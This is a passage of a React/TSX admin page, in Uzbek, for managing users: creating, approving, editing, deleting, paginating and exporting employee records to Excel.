                      className="w-full glass-card rounded-xl px-4 py-2.5 text-sm text-[color:var(--emerald-deep)] placeholder:text-[color:var(--ink-soft)] outline-none focus:ring-2 focus:ring-amber-400"
                      data-ai-action="admin.createUser.phone"
                    />
                  </div>
                  <div>
                    <label htmlFor="create-department" className="sr-only">Bo'lim</label>
                    <select 
                      id="create-department"
                      value={createForm.department} 
                      onChange={(e) => setCreateForm({ ...createForm, department: e.target.value, position: "" })} 
                      className="w-full glass-card rounded-xl px-4 py-2.5 text-sm text-[color:var(--emerald-deep)] outline-none focus:ring-2 focus:ring-amber-400"
                      data-ai-action="admin.createUser.department"
                    >
                      <option value="">Bo'lim tanlang</option>
                      {departments.map((d) => <option key={d.id} value={d.name}>{d.name}</option>)}
                    </select>
                  </div>
                  <div>
                    <label htmlFor="create-position" className="sr-only">Lavozim</label>
                    <select 
                      id="create-position"
                      value={createForm.position} 
                      onChange={(e) => setCreateForm({ ...createForm, position: e.target.value })} 
                      className="w-full glass-card rounded-xl px-4 py-2.5 text-sm text-[color:var(--emerald-deep)] outline-none focus:ring-2 focus:ring-amber-400"
                      data-ai-action="admin.createUser.position"
                      disabled={!createForm.department}
                    >
                      <option value="">Lavozim tanlang</option>
                      {departments.find((d) => d.name === createForm.department)?.positions.map((p) => (
                        <option key={p.id} value={p.name}>{p.name}</option>
                      ))}
                    </select>
                  </div>
                  <div>
                    <label htmlFor="create-role" className="sr-only">Rol</label>
                    <select 
                      id="create-role"
                      value={createForm.role} 
                      onChange={(e) => setCreateForm({ ...createForm, role: e.target.value })} 
                      className="w-full glass-card rounded-xl px-4 py-2.5 text-sm text-[color:var(--emerald-deep)] outline-none focus:ring-2 focus:ring-amber-400"
                      data-ai-action="admin.createUser.role"
                    >
                      <option value="user">Foydalanuvchi</option>
                      <option value="admin">Admin</option>
                    </select>
                  </div>
                </div>
                <div className="flex gap-2">
                  <button 
                    type="submit" 
                    disabled={creating} 
                    className="flex items-center gap-2 rounded-xl bg-gradient-to-br from-indigo-700 to-indigo-600 px-5 py-2.5 text-sm font-bold text-white shadow-lg hover:scale-105 transition-transform disabled:opacity-50"
                    data-ai-action="admin.createUser.submit"
                    aria-busy={creating}
                  >
                    {creating ? <Loader2 className="h-4 w-4 animate-spin" aria-hidden="true" /> : <UserPlus className="h-4 w-4" aria-hidden="true" />}
                    Yaratish (avtomatik tasdiqlanadi)
                  </button>
                  <button 
                    type="button" 
                    onClick={() => setShowCreate(false)} 
                    className="rounded-xl glass-card px-4 py-2.5 text-sm font-semibold text-[color:var(--ink-soft)]"
                    data-ai-action="admin.createUser.cancel"
                  >
                    Bekor qilish
                  </button>
                </div>
              </form>
            </motion.div>
          )}
        </AnimatePresence>

        {/* Users Table */}
        <div className="glass-card rounded-3xl overflow-hidden">
          <div className="flex flex-col gap-3 p-6 border-b border-white/20 sm:flex-row sm:items-center sm:justify-between">
            <div>
              <h2 className="text-lg font-extrabold text-[color:var(--emerald-deep)]">Foydalanuvchilar ro'yxati</h2>
              <p className="text-sm text-[color:var(--ink-soft)] mt-1">
                Jami {filteredUsers.length} foydalanuvchi topildi
              </p>
            </div>
            <button
              onClick={() => setShowExport(true)}
              className="flex shrink-0 items-center gap-2 self-start rounded-xl bg-gradient-to-br from-emerald-600 to-teal-600 px-4 py-2.5 text-sm font-bold text-white shadow-lg transition-transform hover:scale-[1.03] sm:self-auto"
              data-ai-action="admin.users.export"
              aria-haspopup="dialog"
            >
              <FileSpreadsheet className="h-4 w-4" aria-hidden="true" /> Yuklab olish
            </button>
          </div>
          
          {filteredUsers.length === 0 ? (
            <div className="p-10 text-center" role="status">
              <Users className="mx-auto mb-4 h-12 w-12 text-[color:var(--ink-soft)]" aria-hidden="true" />
              <p className="text-[color:var(--ink-soft)]">Foydalanuvchi topilmadi</p>
              <p className="text-sm text-[color:var(--ink-soft)] mt-2">
                Qidiruv so'zlarini o'zgartirishga yoki filterni tozalashga harakat qiling
              </p>
            </div>
          ) : (
            <>
              <div className="overflow-x-auto">
                <table className="w-full" aria-label="Foydalanuvchilar jadvali">
                  <thead>
                    <tr className="border-b border-white/20">
                      <th scope="col" className="w-10 p-4">
                        <input
                          type="checkbox"
                          checked={allPageSelected}
                          onChange={toggleSelectAllPage}
                          className="h-4 w-4 cursor-pointer rounded accent-indigo-700"
                          aria-label="Joriy sahifadagi barchasini tanlash"
                        />
                      </th>
                      <th scope="col" className="text-left p-4 text-xs font-bold text-[color:var(--ink-soft)] uppercase tracking-wider">Foydalanuvchi</th>
                      <th scope="col" className="text-left p-4 text-xs font-bold text-[color:var(--ink-soft)] uppercase tracking-wider hidden md:table-cell">Aloqa</th>
                      <th scope="col" className="text-left p-4 text-xs font-bold text-[color:var(--ink-soft)] uppercase tracking-wider hidden lg:table-cell">Bo'lim</th>
                      <th scope="col" className="text-left p-4 text-xs font-bold text-[color:var(--ink-soft)] uppercase tracking-wider">Holat</th>
                      <th scope="col" className="text-left p-4 text-xs font-bold text-[color:var(--ink-soft)] uppercase tracking-wider">Ish faoliyati</th>
                      <th scope="col" className="text-right p-4 text-xs font-bold text-[color:var(--ink-soft)] uppercase tracking-wider">Amallar</th>
                    </tr>
                  </thead>
                  <tbody className="divide-y divide-white/10">
                    {paginatedUsers.map((u) => (
                      <tr key={u.id} className={`transition-colors ${selectedIds.includes(u.id) ? "bg-indigo-50/60" : "hover:bg-white/5"}`}>
                        <td className="p-4">
                          <input
                            type="checkbox"
                            checked={selectedIds.includes(u.id)}
                            onChange={() => toggleSelect(u.id)}
                            className="h-4 w-4 cursor-pointer rounded accent-indigo-700"
                            aria-label={`${u.name} ${u.surname || ""} foydalanuvchisini tanlash`}
                          />
                        </td>
                        <td className="p-4">
                          <div className="flex items-center gap-3">
                            <div className="grid h-10 w-10 shrink-0 place-items-center rounded-xl bg-gradient-to-br from-indigo-600 to-amber-500 text-white font-extrabold text-sm shadow-lg" aria-hidden="true">
                              {u.name[0]}{u.surname?.[0] || ""}
                            </div>
                            <div>
                              <div className="flex items-center gap-2">
                                <p className="text-sm font-bold text-[color:var(--emerald-deep)]">{u.name} {u.surname}</p>
                                {u.role === "admin" && (
                                  <span className="glass-pill text-[10px] font-bold text-purple-700" aria-label="Admin roli">
                                    <Shield className="inline h-3 w-3 mr-1" aria-hidden="true" />
                                    Admin
                                  </span>
                                )}
                              </div>
                              <p className="text-xs text-[color:var(--ink-soft)]">{u.email}</p>
                            </div>
                          </div>
                        </td>
                        <td className="p-4 hidden md:table-cell">
                          <div className="text-sm text-[color:var(--ink-soft)]">
                            {u.phone && (
                              <p className="flex items-center gap-1">
                                <Phone className="h-3 w-3" aria-hidden="true" /> {u.phone}
                              </p>
                            )}
                          </div>
                        </td>
                        <td className="p-4 hidden lg:table-cell">
                          <div className="text-sm text-[color:var(--ink-soft)]">
                            {u.department && <p>{u.department}</p>}
                            {u.position && <p className="text-xs">{u.position}</p>}
                          </div>
                        </td>
                        <td className="p-4">
                          <span className={`inline-flex items-center gap-1 glass-pill text-xs font-bold ${
                            u.status === "approved" ? "text-indigo-700" : 
                            u.status === "pending" ? "text-amber-700" : "text-rose-700"
                          }`} aria-label={`Holat: ${u.status === "approved" ? "Tasdiqlangan" : u.status === "pending" ? "Kutilayotgan" : "Rad etilgan"}`}>
                            {u.status === "approved" ? <CheckCircle2 className="h-3 w-3" aria-hidden="true" /> : 
                             u.status === "pending" ? <Clock className="h-3 w-3" aria-hidden="true" /> : 
                             <XCircle className="h-3 w-3" aria-hidden="true" />}
                            {u.status === "approved" ? "Tasdiqlangan" : u.status === "pending" ? "Kutilayotgan" : "Rad etilgan"}
                          </span>
                        </td>
                        <td className="p-4">
                          {u.status !== "approved" ? (
                            <span className="text-[11px] font-semibold text-[color:var(--ink-soft)] opacity-60">—</span>
                          ) : (
                            <button
                              onClick={() => handleToggleActive(u, !u.isActive)}
                              disabled={actionLoading === u.id}
                              role="switch"
                              aria-checked={u.isActive}
                              aria-label={`${u.name} ${u.surname || ""}: ${u.isActive ? "ish faoliyatida" : "ish faoliyatida emas"} — o'zgartirish`}
                              data-ai-action={`admin.activity.${u.id}`}
                              className={`toggle-track ${
                                actionLoading === u.id ? "toggle-track--disabled" : ""
                              } ${u.isActive ? "toggle-track--active" : "toggle-track--inactive"}`}
                            >
                              <span
                                className={`toggle-thumb ${
                                  u.isActive ? "toggle-thumb--active" : "toggle-thumb--inactive"
                                }`}
                              />
                            </button>
                          )}
                        </td>
                        <td className="p-4 text-right">
                          <div className="flex items-center justify-end gap-2">
                            {u.status === "pending" && (
                              <>
                                <button
                                  onClick={() => handleApprove(u.id)}
                                  disabled={actionLoading === u.id}
                                  className="flex items-center gap-1.5 rounded-xl bg-gradient-to-br from-indigo-600 to-teal-600 px-3 py-1.5 text-xs font-bold text-white shadow-lg hover:scale-105 transition-transform disabled:opacity-50"
                                  data-ai-action={`admin.approve.${u.id}`}
                                  aria-label={`${u.name} ${u.surname} foydalanuvchisini tasdiqlash`}
                                >
                                  {actionLoading === u.id ? <Loader2 className="h-3 w-3 animate-spin" aria-hidden="true" /> : <CheckCircle2 className="h-3 w-3" aria-hidden="true" />}
                                  Tasdiqlash
                                </button>
                                <button
                                  onClick={() => handleReject(u.id)}
                                  disabled={actionLoading === u.id}
                                  className="flex items-center gap-1.5 rounded-xl bg-rose-50 border border-rose-200 px-3 py-1.5 text-xs font-bold text-rose-700 hover:bg-rose-100 transition-colors disabled:opacity-50"
                                  data-ai-action={`admin.reject.${u.id}`}
                                  aria-label={`${u.name} ${u.surname} foydalanuvchisini rad etish`}
                                >
                                  <XCircle className="h-3 w-3" aria-hidden="true" /> Rad etish
                                </button>
                              </>
                            )}
                            <button
                              onClick={() => openEdit(u)}
                              className="flex items-center gap-1.5 rounded-xl bg-white/70 border border-white/60 px-3 py-1.5 text-xs font-bold text-[color:var(--emerald-deep)] hover:bg-white transition-colors"
                              data-ai-action={`admin.edit.${u.id}`}
                              aria-label={`${u.name} ${u.surname} ma'lumotlarini tahrirlash`}
                            >
                              <Pencil className="h-3 w-3" aria-hidden="true" /> Tahrirlash
                            </button>
                            <button
                              onClick={() => setDeletingUser(u)}
                              className="flex items-center gap-1.5 rounded-xl bg-rose-50 border border-rose-200 px-3 py-1.5 text-xs font-bold text-rose-700 hover:bg-rose-100 transition-colors"
                              data-ai-action={`admin.delete.${u.id}`}
                              aria-label={`${u.name} ${u.surname} foydalanuvchisini o'chirish`}
                            >
                              <Trash2 className="h-3 w-3" aria-hidden="true" /> O'chirish
                            </button>
                          </div>
                        </td>
                      </tr>
                    ))}
                  </tbody>
                </table>
              </div>

              {/* Pagination */}
              {totalPages > 1 && (
                <nav className="p-4 border-t border-white/20 flex items-center justify-between" aria-label="Sahifalar navigatsiyasi">
                  <button
                    onClick={() => setCurrentPage(p => Math.max(1, p - 1))}
                    disabled={currentPage === 1}
                    className="flex items-center gap-1 rounded-lg bg-black/[0.04] px-3 py-2 text-xs font-bold text-[color:var(--ink-soft)] transition-colors hover:bg-black/[0.09] hover:text-[color:var(--emerald-deep)] disabled:opacity-40 disabled:cursor-not-allowed"
                    data-ai-action="admin.pagination.prev"
                    aria-label="Oldingi sahifa"
                  >
                    <ChevronLeft className="h-4 w-4" aria-hidden="true" /> Oldingi
                  </button>
                  
                  <div className="flex items-center gap-1">
                    {Array.from({ length: Math.min(5, totalPages) }, (_, i) => {
                      let pageNum: number;
                      if (totalPages <= 5) {
                        pageNum = i + 1;
                      } else if (currentPage <= 3) {
                        pageNum = i + 1;
                      } else if (currentPage >= totalPages - 2) {
                        pageNum = totalPages - 4 + i;
                      } else {
                        pageNum = currentPage - 2 + i;
                      }
                      return (
                        <button
                          key={pageNum}
                          onClick={() => setCurrentPage(pageNum)}
                          className={`h-8 w-8 rounded-lg text-xs font-bold transition-colors ${
                            currentPage === pageNum
                              ? "bg-gradient-to-br from-indigo-700 to-indigo-600 text-white shadow-md"
                              : "bg-black/[0.04] text-[color:var(--ink-soft)] hover:bg-black/[0.09] hover:text-[color:var(--emerald-deep)]"
                          }`}
                          aria-label={`Sahifa ${pageNum}`}
                          aria-current={currentPage === pageNum ? "page" : undefined}
                        >
                          {pageNum}
                        </button>
                      );
                    })}
                  </div>
                  
                  <button
                    onClick={() => setCurrentPage(p => Math.min(totalPages, p + 1))}
                    disabled={currentPage === totalPages}
                    className="flex items-center gap-1 rounded-lg bg-black/[0.04] px-3 py-2 text-xs font-bold text-[color:var(--ink-soft)] transition-colors hover:bg-black/[0.09] hover:text-[color:var(--emerald-deep)] disabled:opacity-40 disabled:cursor-not-allowed"
                    data-ai-action="admin.pagination.next"
                    aria-label="Keyingi sahifa"
                  >
                    Keyingi <ChevronRight className="h-4 w-4" aria-hidden="true" />
                  </button>
                </nav>
              )}

              {/* ===== Bulk panel — bir nechta odamni bir vaqtda ochish ===== */}
              {selectedIds.length > 0 && (
                <div className="sticky bottom-3 z-20 mt-3 flex flex-wrap items-center gap-2 rounded-2xl border border-indigo-200 bg-white/95 p-3 shadow-xl backdrop-blur" role="region" aria-label="Tanlangan foydalanuvchilar bilan amallar">
                  <span className="flex items-center gap-2 text-sm font-bold text-[color:var(--emerald-deep)]">
                    <span className="grid h-6 min-w-6 place-items-center rounded-full bg-indigo-700 px-1.5 text-xs text-white" aria-hidden="true">{selectedIds.length}</span>
                    ta tanlandi
                  </span>

                  <button
                    onClick={() => openEditInQueue(0)}
                    className="flex items-center gap-1.5 rounded-xl bg-gradient-to-br from-indigo-700 to-indigo-600 px-3 py-2 text-xs font-bold text-white shadow-md transition-transform hover:scale-[1.03]"
                    data-ai-action="admin.users.openSelected"
                  >
                    <Pencil className="h-3.5 w-3.5" aria-hidden="true" /> Ochish
                  </button>

                  <button
                    onClick={() => setShowExport(true)}
                    className="flex items-center gap-1.5 rounded-xl bg-emerald-600 px-3 py-2 text-xs font-bold text-white shadow-md transition-colors hover:bg-emerald-700"
                    data-ai-action="admin.users.exportSelected"
                  >
                    <FileSpreadsheet className="h-3.5 w-3.5" aria-hidden="true" /> Excel
                  </button>

                  <button
                    onClick={() => setSelectedIds([])}
                    className="ml-auto flex items-center gap-1.5 rounded-xl border border-black/10 bg-white px-3 py-2 text-xs font-bold text-[color:var(--ink-soft)] transition-colors hover:bg-neutral-100"
                    data-ai-action="admin.users.clearSelection"
                  >
                    <XCircle className="h-3.5 w-3.5" aria-hidden="true" /> Bekor qilish
                  </button>
                </div>
              )}
            </>
          )}
        </div>
      </div>

      {/* ===== Excel yuklab olish popup ===== */}
      <AnimatePresence>
        {showExport && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 grid place-items-center bg-neutral-900/50 p-4 backdrop-blur-sm"
            onClick={() => !exporting && setShowExport(false)}
          >
            <motion.div
              initial={{ opacity: 0, scale: 0.95, y: 12 }}
              animate={{ opacity: 1, scale: 1, y: 0 }}
              exit={{ opacity: 0, scale: 0.95, y: 12 }}
              transition={{ duration: 0.2 }}
              role="dialog"
              aria-modal="true"
              aria-labelledby="export-title"
              className="w-full max-w-lg rounded-3xl border border-black/10 bg-white p-6 shadow-2xl"
              onClick={(e) => e.stopPropagation()}
            >
              <div className="flex items-start gap-3">
                <span className="grid h-11 w-11 shrink-0 place-items-center rounded-2xl bg-gradient-to-br from-emerald-600 to-teal-600 text-white shadow-lg" aria-hidden="true">
                  <FileSpreadsheet className="h-5 w-5" />
                </span>
                <div>
                  <h2 id="export-title" className="text-lg font-extrabold text-[color:var(--emerald-deep)]">
                    Ishchilar ro'yxatini yuklab olish
                  </h2>
                  <p className="text-sm text-[color:var(--ink-soft)]">
                    Qaysi turdagi ma'lumotni Excel (.xlsx) faylga yuklamoqchisiz?
                  </p>
                </div>
              </div>

              <div className="mt-5 space-y-2">
                {selectedIds.length > 0 && (
                  <ExportOption
                    index={1}
                    count={selectedIds.length}
                    title="Faqat belgilanganlar"
                    hint="Jadvalda checkbox orqali tanlangan foydalanuvchilar"
                    icon={<Users className="h-4 w-4" aria-hidden="true" />}
                    disabled={exporting}
                    onClick={() => handleExport("selected")}
                  />
                )}
                  <ExportOption
                    index={selectedIds.length > 0 ? 2 : 1}
                    count={stats.total}
                    title="Umumiy — barchasi"
                  hint="Barcha foydalanuvchilarning to'liq ma'lumoti"
                  icon={<Users className="h-4 w-4" aria-hidden="true" />}
                  disabled={exporting}
                  onClick={() => handleExport("all")}
                />
                  <ExportOption
                    index={selectedIds.length > 0 ? 3 : 2}
                    count={stats.active}
                    title="Faqat ishlayotganlar"
                    hint="Ish faoliyatida belgilangan xodimlar"
                    icon={<CheckCircle2 className="h-4 w-4" aria-hidden="true" />}
                  tone="emerald"
                  disabled={exporting}
                  onClick={() => handleExport("active")}
                />
                  <ExportOption
                    index={selectedIds.length > 0 ? 4 : 3}
                    count={stats.inactive}
                    title="Faqat ishlamayotganlar"
                  hint="Ish faoliyatida belgi yo'q xodimlar"
                  icon={<XCircle className="h-4 w-4" aria-hidden="true" />}
                  tone="rose"
                  disabled={exporting}
                  onClick={() => handleExport("inactive")}
                />
              </div>

              <div className="mt-6 flex items-center justify-between gap-3">
                <p className="text-xs text-[color:var(--ink-soft)]">
                  {exporting ? "Fayl tayyorlanmoqda..." : "Fayl 'Yuklab olishlar' papkasiga saqlanadi"}
                </p>
                <div className="flex gap-2">
                  <button
                    type="button"
                    onClick={() => setShowExport(false)}
                    disabled={exporting}
                    className="rounded-xl border border-black/10 bg-white px-4 py-2 text-sm font-bold text-[color:var(--ink-soft)] transition-colors hover:bg-neutral-100 disabled:opacity-50"
                  >
                    Yopish
                  </button>
                  {exporting && (
                    <span className="flex items-center gap-2 rounded-xl bg-emerald-50 px-4 py-2 text-sm font-bold text-emerald-700">
                      <Loader2 className="h-4 w-4 animate-spin" aria-hidden="true" /> Yuklanmoqda
                    </span>
                  )}
                </div>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Edit modal */}
      <AnimatePresence>
        {editingUser && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 grid place-items-center bg-black/40 p-4"
            onClick={() => !editLoading && setEditingUser(null)}
          >
            <motion.form
              onClick={(e) => e.stopPropagation()}
              onSubmit={handleEdit}
              initial={{ opacity: 0, y: 20, scale: 0.96 }}
              animate={{ opacity: 1, y: 0, scale: 1 }}
              exit={{ opacity: 0, y: 10, scale: 0.96 }}
              className="glass-card rounded-3xl p-6 w-full max-w-lg space-y-4"
              aria-label="Foydalanuvchini tahrirlash"
            >
              <div className="flex items-start justify-between gap-3">
                <div>
                  <h3 className="text-lg font-extrabold text-[color:var(--emerald-deep)]">Foydalanuvchini tahrirlash</h3>
                  <p className="text-xs text-[color:var(--ink-soft)] mt-0.5">{editingUser.email}</p>
                </div>
                <button type="button" onClick={() => setEditingUser(null)} className="text-neutral-500 hover:text-neutral-800" aria-label="Yopish">
                  <XCircleIcon className="h-5 w-5" />
                </button>
              </div>

              {/* Tanlanganlar orasida ketma-ket yurish */}
              {selectedIds.length > 1 && (
                <div className="mt-3 flex items-center justify-between gap-2 rounded-2xl border border-indigo-200 bg-indigo-50/70 p-2" role="group" aria-label="Tanlangan foydalanuvchilar orasida yurish">
                  <button
                    type="button"
                    onClick={() => openEditInQueue(editQueuePos - 1)}
                    className="flex items-center gap-1 rounded-xl bg-white px-3 py-1.5 text-xs font-bold text-[color:var(--emerald-deep)] shadow-sm transition-colors hover:bg-neutral-100"
                    data-ai-action="admin.users.prevSelected"
                  >
                    <ChevronLeft className="h-3.5 w-3.5" aria-hidden="true" /> Oldingi
                  </button>
                  <span className="text-xs font-bold text-[color:var(--emerald-deep)]" aria-live="polite">
                    {editQueuePos + 1} / {selectedIds.length}
                  </span>
                  <button
                    type="button"
                    onClick={() => openEditInQueue(editQueuePos + 1)}
                    className="flex items-center gap-1 rounded-xl bg-white px-3 py-1.5 text-xs font-bold text-[color:var(--emerald-deep)] shadow-sm transition-colors hover:bg-neutral-100"
                    data-ai-action="admin.users.nextSelected"
                  >
                    Keyingi <ChevronRight className="h-3.5 w-3.5" aria-hidden="true" />
                  </button>
                </div>
              )}

              <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                <div>
                  <label className="block text-xs font-bold text-[color:var(--emerald-deep)] mb-1">Ism</label>
                  <input required value={editForm.name} onChange={(e) => setEditForm({ ...editForm, name: e.target.value })} className="w-full rounded-xl glass-card px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-amber-400" />
                </div>
                <div>
                  <label className="block text-xs font-bold text-[color:var(--emerald-deep)] mb-1">Familiya</label>
                  <input value={editForm.surname} onChange={(e) => setEditForm({ ...editForm, surname: e.target.value })} className="w-full rounded-xl glass-card px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-amber-400" />
                </div>
                <div>
                  <label className="block text-xs font-bold text-[color:var(--emerald-deep)] mb-1">Telefon</label>
                  <input value={editForm.phone} onChange={(e) => setEditForm({ ...editForm, phone: e.target.value })} placeholder="+998 90 123 45 67" className="w-full rounded-xl glass-card px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-amber-400" />
                </div>
                <div>
                  <label className="block text-xs font-bold text-[color:var(--emerald-deep)] mb-1">Bo'lim</label>
                  <select value={editForm.department} onChange={(e) => setEditForm({ ...editForm, department: e.target.value, position: "" })} className="w-full rounded-xl glass-card px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-amber-400 bg-white">
                    <option value="">Bo'lim tanlang</option>
                    {departments.map((d) => <option key={d.id} value={d.name}>{d.name}</option>)}
                  </select>
                </div>
                <div>
                  <label className="block text-xs font-bold text-[color:var(--emerald-deep)] mb-1">Lavozim</label>
                  <select value={editForm.position} onChange={(e) => setEditForm({ ...editForm, position: e.target.value })} className="w-full rounded-xl glass-card px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-amber-400 bg-white" disabled={!editForm.department}>
                    <option value="">Lavozim tanlang</option>
                    {departments.find((d) => d.name === editForm.department)?.positions.map((p) => (
                      <option key={p.id} value={p.name}>{p.name}</option>
                    ))}
                  </select>
                </div>
                <div>
                  <label className="block text-xs font-bold text-[color:var(--emerald-deep)] mb-1">Rol</label>
                  <select value={editForm.role} onChange={(e) => setEditForm({ ...editForm, role: e.target.value })} className="w-full rounded-xl glass-card px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-amber-400 bg-white">
                    <option value="user">Foydalanuvchi</option>
                    <option value="admin">Admin</option>
                  </select>
                </div>
                <div>
                  <label className="block text-xs font-bold text-[color:var(--emerald-deep)] mb-1">Holat</label>
                  <select value={editForm.status} onChange={(e) => setEditForm({ ...editForm, status: e.target.value })} className="w-full rounded-xl glass-card px-3 py-2 text-sm outline-none focus:ring-2 focus:ring-amber-400 bg-white">
<option value="approved">Tasdiqlangan</option>
                <option value="pending">Kutilayotgan</option>
                <option value="rejected">Rad etilgan</option>
                {/* Xavfsizlik: konsol/DevTools aniqlanganda bot avtomatik shu holatga o'tkazadi */}
                <option value="blocked">Bloklangan (konsol)</option>
                  </select>
                </div>
                <div className="sm:col-span-2">
                  <label className="block text-xs font-bold text-[color:var(--emerald-deep)] mb-1">Ish faoliyati</label>
                  <div className="flex items-center justify-between gap-3 rounded-xl glass-card px-3 py-2">
                    <span className="text-sm font-semibold text-[color:var(--ink-soft)]">
                      {editForm.isActive ? "Ish faoliyatida" : "Ish faoliyatida emas"}
                    </span>
                    <span className="inline-flex items-center gap-3">
                      <button
                        type="button"
                        role="switch"
                        aria-checked={editForm.isActive}
                        aria-label="Ish faoliyati holatini o'zgartirish"
                        onClick={() => setEditForm({ ...editForm, isActive: !editForm.isActive })}
                        className={`toggle-track ${
                          editForm.isActive ? "toggle-track--active" : "toggle-track--inactive"
                        }`}
                      >
                        <span className={`toggle-thumb ${
                          editForm.isActive ? "toggle-thumb--active" : "toggle-thumb--inactive"
                        }`} />
                      </button>
                      <span className="text-sm font-semibold text-[10px] text-[color:var(--ink-soft)]">
                        {editForm.isActive ? "Ish faoliyatida" : "Ish faoliyatida emas"}
                      </span>
                    </span>
                  </div>
                </div>
                <div>
                  <label className="block text-xs font-bold text-[color:var(--emerald-deep)] mb-1">Yangi parol (ixtiyoriy)</label>
                  <div className="relative">
                    <input
                      type={showEditPassword ? "text" : "password"}
                      value={editForm.password}
                      onChange={(e) => setEditForm({ ...editForm, password: e.target.value })}
                      placeholder="O'zgartirmaslik uchun bo'sh qoldiring"
                      className="w-full rounded-xl glass-card px-3 py-2 pr-9 text-sm outline-none focus:ring-2 focus:ring-amber-400"
                      autoComplete="new-password"
                    />
                    <button type="button" onClick={() => setShowEditPassword((s) => !s)} className="absolute right-2 top-1/2 -translate-y-1/2 text-neutral-500" aria-label="Parolni ko'rsatish/yashirish">
                      {showEditPassword ? <EyeOff className="h-4 w-4" /> : <Eye className="h-4 w-4" />}
                    </button>
                  </div>
                </div>
              </div>

              <div className="flex items-center justify-end gap-2 pt-2">
                <button type="button" onClick={() => setEditingUser(null)} disabled={editLoading} className="rounded-xl bg-white/70 border border-white/60 px-4 py-2 text-sm font-bold text-[color:var(--ink-soft)] hover:bg-white disabled:opacity-50">
                  Bekor qilish
                </button>
                <button type="submit" disabled={editLoading} className="rounded-xl bg-gradient-to-br from-indigo-600 to-teal-600 px-4 py-2 text-sm font-bold text-white shadow-lg disabled:opacity-50 flex items-center gap-2">
                  {editLoading ? <Loader2 className="h-4 w-4 animate-spin" /> : <CheckCircle2 className="h-4 w-4" />}
                  Saqlash
                </button>
              </div>
            </motion.form>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Delete confirmation */}
      <AnimatePresence>
        {deletingUser && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 grid place-items-center bg-black/40 p-4"
            onClick={() => !deleteLoading && setDeletingUser(null)}
          >
            <motion.div
              onClick={(e) => e.stopPropagation()}
              initial={{ opacity: 0, y: 20, scale: 0.96 }}
              animate={{ opacity: 1, y: 0, scale: 1 }}
              exit={{ opacity: 0, y: 10, scale: 0.96 }}
              className="glass-card rounded-3xl p-6 w-full max-w-md space-y-4"
              role="alertdialog"
              aria-label="O'chirishni tasdiqlash"
            >
              <div className="flex items-start gap-3">
                <div className="grid h-12 w-12 shrink-0 place-items-center rounded-2xl bg-rose-100 text-rose-600" aria-hidden="true">
                  <Trash2 className="h-6 w-6" />
                </div>
                <div>
                  <h3 className="text-lg font-extrabold text-[color:var(--emerald-deep)]">Foydalanuvchini o'chirish</h3>
                  <p className="text-sm text-[color:var(--ink-soft)] mt-1">
                    <span className="font-bold text-[color:var(--emerald-deep)]">{deletingUser.name} {deletingUser.surname}</span>
                    {' '}({deletingUser.email}) — barcha darslar, test natijalari va enrollment yozuvlari bilan birga o'chiriladi. Bu amalni qaytarib bo'lmaydi.
                  </p>
                </div>
              </div>
              <div className="flex items-center justify-end gap-2">
                <button type="button" onClick={() => setDeletingUser(null)} disabled={deleteLoading} className="rounded-xl bg-white/70 border border-white/60 px-4 py-2 text-sm font-bold text-[color:var(--ink-soft)] hover:bg-white disabled:opacity-50">
                  Bekor qilish
                </button>
                <button type="button" onClick={handleDelete} disabled={deleteLoading} className="rounded-xl bg-rose-600 px-4 py-2 text-sm font-bold text-white shadow-lg disabled:opacity-50 flex items-center gap-2">
                  {deleteLoading ? <Loader2 className="h-4 w-4 animate-spin" /> : <Trash2 className="h-4 w-4" />}
                  Ha, o'chirish
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </main>
  );
}
